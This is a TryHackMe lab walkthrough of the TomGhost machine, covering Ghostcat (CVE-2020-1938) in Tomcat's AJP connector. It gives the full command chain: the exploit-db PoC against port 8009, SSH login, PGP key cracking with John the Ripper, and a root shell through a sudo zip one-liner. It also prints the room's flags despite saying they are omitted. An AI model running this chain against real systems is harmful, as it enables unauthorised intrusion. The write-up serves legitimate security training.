# TomGhost — TryHackMe Walkthrough

Today we are going to look at **Ghostcat (CVE-2020-1938)**, a vulnerability discovered by Chaitin Tech security researchers in February 2020.

Ghostcat affects Apache Tomcat's **Apache JServ Protocol (AJP)** connector. In its default configuration, vulnerable versions of Tomcat could allow an attacker who can reach the AJP connector to read files from a deployed web application.

In certain circumstances, this could potentially be escalated to remote code execution.

This walkthrough covers the **TomGhost** machine on TryHackMe and demonstrates how the exposed AJP service can be used to retrieve credentials, obtain an SSH session, move between users, and ultimately escalate privileges to root.

---

## What Is Ghostcat?

Ghostcat is a **Local File Inclusion (LFI)** vulnerability in Apache Tomcat's AJP connector.

By exploiting the vulnerability, an attacker can potentially read:

* Configuration files
* Application source code
* Files belonging to deployed web applications

Ghostcat is **not automatically a Remote Code Execution (RCE) vulnerability**.

For Ghostcat to become an RCE, additional conditions are required.

One possible scenario involves an application that:

1. Allows users to upload files.
2. Stores those files inside the web application's directory.
3. Allows the uploaded file to be processed as JSP.
4. Has an attacker who can directly reach the AJP connector.

This combination can allow a malicious JSP file to be included and executed by Tomcat.

---

## What Is AJP?

**AJP (Apache JServ Protocol)** is a binary protocol used by Apache Tomcat to communicate with web servers such as Apache HTTP Server.

A common architecture looks like this:

```text
Internet
   |
   v
Apache HTTP Server
   |
   | AJP
   v
Apache Tomcat
```

The HTTP connector is normally exposed to clients, while AJP is intended for communication between the web server and Tomcat.

The default AJP port is:

```text
8009
```

Because AJP is normally intended for internal communication, exposing it directly to the internet is considered an insecure configuration.

---

## Why Does Ghostcat Exist?

Tomcat historically treated AJP connections as more trusted than normal HTTP connections.

When AJP is configured securely, a secret can be required before requests are accepted.

However, older default configurations did not enable this secret.

This meant that an attacker who could reach the AJP connector could potentially send requests without authentication.

That is particularly dangerous when port `8009` is exposed externally.

---

# TomGhost — TryHackMe Walkthrough

Before getting started, the machine we are attacking is the **TomGhost** room on TryHackMe.

The objective is to identify the vulnerable service, exploit Ghostcat, obtain credentials, gain an SSH foothold, and escalate privileges to root.

---

## Deploying the Machine

First, deploy the TomGhost machine from TryHackMe.

Once the machine has started, note the assigned IP address.

I will refer to the target as:

```text
10.113.184.167
```

---

## Reconnaissance

I started with an Nmap scan to identify the services running on the target.

```bash
nmap -A -Pn 10.113.184.167
```

The scan revealed several services, including SSH and the AJP connector.

The important port for us was:

```text
8009/tcp
```

This is the default port used by the Apache JServ Protocol.

Seeing AJP exposed externally immediately caught my attention because Ghostcat targets this protocol.

---

## Exploiting Ghostcat

The next step was to look for a publicly available Ghostcat exploit.

One commonly referenced proof-of-concept is available on Exploit Database:

[Exploit Database — Ghostcat CVE-2020-1938](https://www.exploit-db.com/exploits/48143?utm_source=chatgpt.com)

After downloading the exploit, I ran it against the AJP service:

```bash
python2 48143.py -p 8009 10.113.184.167
```

The exploit successfully interacted with the vulnerable AJP connector.

The response revealed credentials:

```text
username: skyfuck
password: <redacted>
```

At this point, we had valid credentials that could potentially be used to access another service.

---

## SSH Access

From the Nmap scan, we already knew that SSH was running on port `22`.

I therefore tried the discovered credentials against SSH:

```bash
ssh skyfuck@10.113.184.167
```

After entering the password, I successfully obtained a shell.

We now had access to the machine as:

```text
skyfuck
```

---

## Finding the User Flag

My first step after obtaining a shell was to look for the user flag.

I initially checked the current user's home directory:

```bash
ls
```

However, the expected `user.txt` file was not there.

I then checked `/home`:

```bash
ls /home
```

This revealed another user:

```text
merlin
```

I checked whether the `skyfuck` user could access Merlin's home directory:

```bash
ls -la /home/merlin
```

The directory was accessible.

I entered it:

```bash
cd /home/merlin
```

Listing the files revealed:

```text
user.txt
```

<details>
<summary>Spoiler Alert!</summary>

THM{GhostCat_1s_so_cr4sy}

</details>

I checked the permissions:

```bash
ls -la user.txt
```

The current user had permission to read the file.

I could therefore retrieve the user flag with:

```bash
cat user.txt
```

The flag is not included here.

---

## Checking Sudo Permissions

Next, I checked whether the current user had any sudo privileges:

```bash
sudo -l
```

The result showed that `skyfuck` was not able to execute privileged commands.

So we needed to find another way to become the `merlin` user.

---

# Investigating the Home Directory

I returned to the `skyfuck` home directory:

```bash
cd /home/skyfuck
ls -la
```

Two files immediately stood out:

```text
credential.pgp
tryhackme.asc
```

These looked like an encrypted PGP credential file and the corresponding private key.

The goal was to recover the password contained inside `credential.pgp`.

---

## Downloading the Files

I used SFTP to transfer the files to my local machine:

```bash
sftp skyfuck@<10.113.184.167>
```

Once connected, I downloaded the files:

```text
sftp> get credential.pgp
sftp> get tryhackme.asc
```

The files were now available on my attacking machine.

---

# Cracking the PGP Key

The next step was to recover the password protecting the PGP key.

I used `gpg2john` to convert the key into a format that John the Ripper could crack:

```bash
gpg2john tryhackme.asc > hash
```

I then used John the Ripper with the `rockyou.txt` wordlist:

```bash
john --wordlist=rockyou.txt hash
```

After the password was cracked, I had the secret required to use the PGP key.

---

## Importing the PGP Key

I imported the key into GPG:

```bash
gpg --import tryhackme.asc
```

GPG then asked for the password recovered by John the Ripper.

Once the key was imported, I decrypted the credential file:

```bash
gpg --decrypt credential.pgp
```

The decrypted file revealed credentials for the `merlin` user:

```text
username: merlin
password: <redacted>
```

We now had what we needed to switch users.

---

# Switching to Merlin

I used `su` to become the `merlin` user:

```bash
su merlin
```

After entering the recovered password, I was successfully logged in as:

```text
merlin
```

I then checked the sudo permissions for this account:

```bash
sudo -l
```

This time, the output was much more interesting.

The `merlin` user was allowed to execute the `zip` command as root.

In other words, we had a **sudo privilege escalation path through `zip`**.

---

# Privilege Escalation

The `zip` binary can be abused in certain sudo configurations because it supports an option that allows an external command to be executed after an archive operation.

I first created a small file:

```bash
touch raj.txt
```

I then used the permitted `zip` command with the external command option:

```bash
sudo zip 1.zip raj.txt -T --unzip-command="sh -c /bin/bash"
```

Because the command was being executed through `sudo`, the resulting shell was running with root privileges.

I checked the current user:

```bash
whoami
```

The result was:

```text
root
```

We had successfully escalated from `skyfuck` to `merlin` and finally to `root`.

---

# Getting the Root Flag

Now that we had root access, the final flag was located in the root user's home directory:

```bash
cd /root
ls
```

The root flag was:

```text
root.txt
```

It could be read with:

```bash
cat /root/root.txt
```

The flag is not included here.

---

# Attack Chain

The complete attack path looked like this:

```text
Exposed AJP (8009)
        |
        v
Ghostcat / CVE-2020-1938
        |
        v
Read application files
        |
        v
Recover skyfuck credentials
        |
        v
SSH as skyfuck
        |
        v
Find credential.pgp + tryhackme.asc
        |
        v
Crack PGP key with John the Ripper
        |
        v
Decrypt credential.pgp
        |
        v
Recover merlin credentials
        |
        v
su merlin
        |
        v
sudo -l
        |
        v
zip allowed as root
        |
        v
Privilege Escalation
        |
        v
root
```
<details>
<summary>Spoiler Alert!</summary>

THM{Z1P_1S_FAKE}

</details>


---

# Room Completed

The TomGhost machine was completed by following this attack chain:

* Scanned the target with Nmap.
* Identified the exposed AJP service on port `8009`.
* Recognized the potential for Ghostcat exploitation.
* Used a Ghostcat proof of concept to retrieve sensitive information.
* Recovered credentials for the `skyfuck` user.
* Used SSH to obtain an initial shell.
* Located the `user.txt` flag through the `merlin` home directory.
* Discovered encrypted PGP files in the `skyfuck` home directory.
* Downloaded the files using SFTP.
* Converted the PGP key into a crackable format with `gpg2john`.
* Cracked the key using John the Ripper.
* Decrypted `credential.pgp`.
* Recovered the `merlin` user's password.
* Switched to the `merlin` account.
* Used `sudo -l` to discover that `zip` could be executed as root.
* Abused the permitted `zip` functionality to obtain a root shell.
* Retrieved the final root flag.

The interesting part of this machine is that the initial foothold comes from **Ghostcat**, but the final compromise depends on chaining several separate weaknesses together: exposed AJP, leaked credentials, weak protection of a PGP key, and an unsafe sudo rule for `zip`.
